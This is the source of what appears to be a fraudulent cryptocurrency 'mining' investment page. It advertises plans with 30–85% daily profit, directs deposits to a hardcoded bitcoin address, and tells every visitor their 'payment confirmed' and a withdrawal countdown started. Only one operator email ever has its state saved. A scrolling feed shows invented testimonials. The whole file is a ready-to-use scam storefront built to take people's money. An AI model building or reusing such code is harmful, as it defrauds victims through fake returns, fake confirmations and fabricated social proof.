<!-- ===== Investment Plans ===== -->
<h2>Investment Plans</h2>
<div class="card" id="plansContainer"></div>

<!-- ===== Live Testimonials ===== -->
<div class="card">
  <h2>Live Testimonials</h2>
  <div class="tx-container" id="testimonials"></div>
</div>

<script>
// ===== LOGIN =====
let currentEmail="";
document.getElementById("loginBtn").onclick=function(){
  const email=document.getElementById("emailInput").value.trim().toLowerCase();
  if(!email){alert("Enter email"); return;}
  currentEmail=email;
  localStorage.setItem("currentEmail",currentEmail);
  document.getElementById("loginCard").style.display="none";
  document.getElementById("dashboard").style.display="block";
  initPlans();
  initTestimonials();
}

// If already logged in
if(localStorage.getItem("currentEmail")){
  currentEmail=localStorage.getItem("currentEmail");
  document.getElementById("loginCard").style.display="none";
  document.getElementById("dashboard").style.display="block";
  initPlans();
  initTestimonials();
}

// ===== Investment Plans =====
const plans = [
  {name:"Plan A", profit:"30%", min:200, max:599},
  {name:"Plan B", profit:"45%", min:600, max:1000},
  {name:"Plan C", profit:"60%", min:1100, max:2000},
  {name:"Plan D", profit:"75%", min:2000, max:4999},
  {name:"Plan E", profit:"80%", min:5000, max:9999},
  {name:"Plan F", profit:"85%", min:10000, max:"Unlimited"}
];

function formatMoney(val){return typeof val==="number"?"$"+val:val;}

function initPlans(){
  const container = document.getElementById("plansContainer");
  container.innerHTML="";
  plans.forEach((plan,index)=>{
    const div = document.createElement("div");
    div.className="plan";
    div.id="plan"+index;
    div.innerHTML=`
      <h3>${plan.name}</h3>
      <p>Daily Profit: ${plan.profit}</p>
      <p>Minimum Investment: ${formatMoney(plan.min)}</p>
      <p>Maximum Investment: ${formatMoney(plan.max)}</p>
      <div class="pay-section" id="paySection${index}">
        <p>Send BTC to:</p>
        <div class="btc-box" id="planBtc${index}">bc1qkwxcdnal9pu6qjs07j88s88987x04k3hsasyav</div>
        <button onclick="copyPlanAddress(${index})">Copy Address</button>
        <div style="text-align:center;margin-top:10px;">
          <img src="https://api.qrserver.com/v1/create-qr-code/?size=140x140&data=bc1qkwxcdnal9pu6qjs07j88s88987x04k3hsasyav">
        </div>
        <p>Upload screenshot of payment:</p>
        <input type="file" id="screenshot${index}" accept="image/*">
        <button id="paidBtn${index}">Paid</button>
        <img id="preview${index}" class="screenshot-img" style="display:none;">
        <p class="countdown" id="countdown${index}">Withdrawal available after 3 days of mining</p>
      </div>
      <button id="investBtn${index}">Invest Now</button>
    `;
    container.appendChild(div);

    const investBtn = document.getElementById("investBtn"+index);
    const paySection = document.getElementById("paySection"+index);
    const screenshotInput = document.getElementById("screenshot"+index);
    const preview = document.getElementById("preview"+index);
    const countdown = document.getElementById("countdown"+index);
    const paidBtn = document.getElementById("paidBtn"+index);

    // Payment logic
    let paymentConfirmed = false;
    let startTime = null;

    if(currentEmail==="evilpaid666@gmail.com"){
      paymentConfirmed = localStorage.getItem("plan"+index+"_confirmed")==="true";
      startTime = paymentConfirmed ? parseInt(localStorage.getItem("plan"+index+"_start")) : null;
      const savedImg = localStorage.getItem("plan"+index+"_screenshot");
      if(savedImg){
        preview.src = savedImg;
        preview.style.display="block";
        paySection.style.display="block";
        investBtn.style.display="none";
      }
    }

    // Countdown
    function updateCountdown(){
      if(!paymentConfirmed){
        countdown.innerText="Withdrawal available after 3 days of mining";
        return;
      }
      const now = Date.now();
      const elapsed = now-startTime;
      const remaining = 3*24*60*60*1000 - elapsed;
      if(remaining<=0){
        countdown.innerText="Withdrawal available now!";
      } else {
        const d = Math.floor(remaining/(1000*60*60*24));
        const h = Math.floor((remaining%(1000*60*60*24))/(1000*60*60));
        const m = Math.floor((remaining%(1000*60*60))/(1000*60));
        const s = Math.floor((remaining%(1000*60))/1000);
        countdown.innerText=`Withdrawal available in ${d}d ${h}h ${m}m ${s}s`;
      }
    }
    setInterval(updateCountdown,1000);
    updateCountdown();

    // Show pay section
    investBtn.onclick = ()=>{
      paySection.style.display="block";
      investBtn.style.display="none";
    }

    // Paid button click
    paidBtn.onclick = ()=>{
      const file = screenshotInput.files[0];
      if(!file){alert("Please upload screenshot first."); return;}
      const reader = new FileReader();
      reader.onload = function(evt){
        if(currentEmail==="evilpaid666@gmail.com"){
          // Only save screenshot for your personal email
          preview.src = evt.target.result;
          preview.style.display="block";
          localStorage.setItem("plan"+index+"_screenshot",evt.target.result);
          localStorage.setItem("plan"+index+"_confirmed","true");
          localStorage.setItem("plan"+index+"_start",Date.now());
        }
        alert(plan.name+" payment confirmed! Withdrawal countdown started.");
      }
      reader.readAsDataURL(file);
    }
  });
}

// ===== Copy BTC address per plan =====
function copyPlanAddress(index){
  const addr=document.getElementById("planBtc"+index).innerText;
  navigator.clipboard.writeText(addr).then(()=>{alert("BTC address copied!");});
}

// ===== Live Testimonials =====
const testimonialsData = [
  {name:"Alice", msg:"Just started mining, love it!"},
  {name:"Bob", msg:"My first BTC deposit was smooth!"},
  {name:"Charlie", msg:"Mining dashboard looks real and professional."},
  {name:"Dana", msg:"I earned 0.002 BTC in just 2 hours!"},
  {name:"Eve", msg:"Highly recommend this platform."}
];

function initTestimonials(){
  const container = document.getElementById("testimonials");
  container.innerHTML="";
  setInterval(()=>{
    const t = testimonialsData[Math.floor(Math.random()*testimonialsData.length)];
    const div = document.createElement("div");
    div.className="tx";
    div.innerHTML=`<span>${t.name}: ${t.msg}</span>`;
    container.prepend(div);
    if(container.children.length>50) container.removeChild(container.lastChild);
  },3000);
}
